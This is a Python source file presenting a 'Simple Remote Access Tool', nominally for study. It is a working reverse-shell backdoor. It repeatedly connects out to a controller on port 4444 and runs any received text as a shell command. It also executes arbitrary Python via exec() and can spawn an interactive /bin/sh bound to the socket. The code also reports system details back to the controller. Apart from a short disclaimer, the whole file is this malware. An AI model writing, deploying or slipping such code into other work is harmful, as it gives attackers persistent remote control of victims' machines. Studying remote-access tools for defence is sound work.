# Python Simple Remote Access Tool
# By farinap5 for study purpose.


import sys
import subprocess
import os
import socket
import time
import pty
import platform

ver = "1.0"
def create_conn(host,port,ver):
    while True:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        # Trying to connect with host
        try:
            s.connect((host,port))
        except socket.error:
            #print("no conn")
            time.sleep(10)
            continue
        s.settimeout(None)
        hostname = socket.gethostname()
        #ip = socket.gethostname(socket.gethostname())
        m1 = "Connection Estabilished!\nP\nHost: {}\nSay Hi!\n\ncmd> ".format(hostname)
        s.send(m1.encode())
        _help = """
Help Menu:
----------
help  | Help menu.
exit  | Break connection but keep running.
close | Close connection and stop.
    
sysinfo | System Information.
pyinfo  | Python Information.
shell   | Spawn shell.
    
cmd> """
        try:
            while 1:
                data = s.recv(1024)
                data = data.decode()
                if data == "close\n":
                    break
                    exit()
                elif data == "exit\n":
                    s.close()
                    break
                    create_conn(host,port)
                elif data == "help\n":
                    s.send(_help.encode())
                elif data == "hi\n":
                    m2 = "Hi, good to see you!\ncmd> "
                    s.send(m2.encode())
                elif data == "shell\n":
                    os.getenv(host)
                    os.getenv(str(port))
                    [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
                    pty.spawn("/bin/sh")
                elif data == "sysinfo\n":
                    mach = platform.machine()
                    sys = platform.system()
                    plat = platform.platform()
                    pross = platform.processor()
                    rel = platform.release()
                    m3 = """
Enviroment:
-----------
System: {}
Machine: {}
Platform: {}
Processor: {}
Release: {}

cmd> """.format(sys,mach,plat,pross,rel)
                    s.send(m3.encode())
                elif data == "pyinfo\n":
                    pyver = platform.python_version()
                    pycompiler = platform.python_compiler()
                    pybuild = platform.python_build()
                    pybranch = platform.python_branch()
                    m4 = """
Python Information:
-------------------
Python Version: {}
Compiler: {}
Build: {}
Branch: {}

cmd> """.format(pyver,pycompiler,pybuild,pybranch)
                    s.send(m4.encode())
                elif data[:4] == "exec":
                    try:
                        exec(data[5:])
                    except:
                        pass
                else:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    s.send(stdout_value)
                    cmd = "cmd> "
                    s.send(cmd.encode())
        except socket.timeout:
            time.sleep(0)
            continue


host = "0.0.0.0"
port = 4444
create_conn(host,port,ver)
